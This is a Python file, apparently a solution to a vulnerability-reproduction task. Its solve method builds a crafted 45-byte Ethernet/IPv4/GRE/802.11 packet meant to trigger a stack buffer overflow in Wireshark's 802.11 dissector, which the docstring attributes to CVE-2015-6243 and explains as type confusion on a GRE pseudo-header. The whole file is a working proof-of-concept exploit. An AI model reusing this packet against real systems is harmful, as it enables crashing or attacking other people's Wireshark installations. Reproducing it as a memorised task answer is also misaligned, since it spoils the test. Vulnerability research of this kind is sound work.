import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a stack buffer overflow in the Wireshark 802.11
        dissector (CVE-2015-6243). It occurs when the dissector is invoked as a
        subdissector for GRE (Generic Routing Encapsulation).

        The root cause is a type confusion on a pseudo-header. The GRE dissector
        passes a pointer to a small, 4-byte stack structure containing GRE flags
        and protocol type. The 802.11 dissector expects a pointer to a much
        larger structure containing radio information.

        It misinterprets the 4 bytes from the GRE pseudo-header as the `data_rate`
        field. This `data_rate` value is used to build a string representation of
        active data rates, concatenating strings into a fixed-size stack buffer.
        If many bits are set in `data_rate`, this operation overflows the buffer.

        To trigger the overflow, we craft a packet that maximizes the number of
        set bits in the interpreted `data_rate`. The `data_rate` is effectively
        `(gre.protocol_type << 16) | gre.flags_and_version`.
        - The 802.11 dissector is registered for GRE protocol type 0x0001.
        - To maximize set bits, we set the GRE flags/version field to 0xFFFF.

        This results in a crafted GRE header of `b'\\xff\\xff\\x00\\x01'`.

        The final PoC is a 45-byte packet consisting of:
        1. A standard Ethernet header (14 bytes).
        2. An IPv4 header indicating the protocol is GRE (20 bytes).
        3. The crafted 4-byte GRE header.
        4. A minimal 7-byte 802.11 payload to ensure the dissector proceeds.
        """

        # Ethernet Header (14 bytes): Dst MAC, Src MAC, EtherType (IPv4)
        eth_header = (
            b'\xff\xff\xff\xff\xff\xff'  # Dst: Broadcast
            b'\x00\x00\x00\x00\x00\x00'  # Src: Null
            b'\x08\x00'                  # EtherType: IPv4
        )

        # IPv4 Header (20 bytes): minimal header for a GRE packet
        # Total Length = 31 (20 IP + 4 GRE + 7 Payload)
        ip_header = (
            b'\x45\x00'                  # Version, IHL, DSCP/ECN
            b'\x00\x1f'                  # Total Length (31 bytes)
            b'\x00\x01'                  # Identification
            b'\x00\x00'                  # Flags, Fragment Offset
            b'\x40'                      # TTL (64)
            b'\x2f'                      # Protocol: GRE (47)
            b'\x00\x00'                  # Header Checksum (zeroed)
            b'\x7f\x00\x00\x01'          # Src IP: 127.0.0.1
            b'\x7f\x00\x00\x01'          # Dst IP: 127.0.0.1
        )

        # Malicious GRE Header (4 bytes)
        # Flags/Version = 0xFFFF, Protocol Type = 0x0001
        gre_header = b'\xff\xff\x00\x01'

        # Minimal WLAN Payload (7 bytes)
        # A valid Frame Control field prevents early exit from the dissector.
        wlan_payload = b'\x08\x01' + b'\x00' * 5

        # Assemble the final packet
        poc = eth_header + ip_header + gre_header + wlan_payload
        
        return poc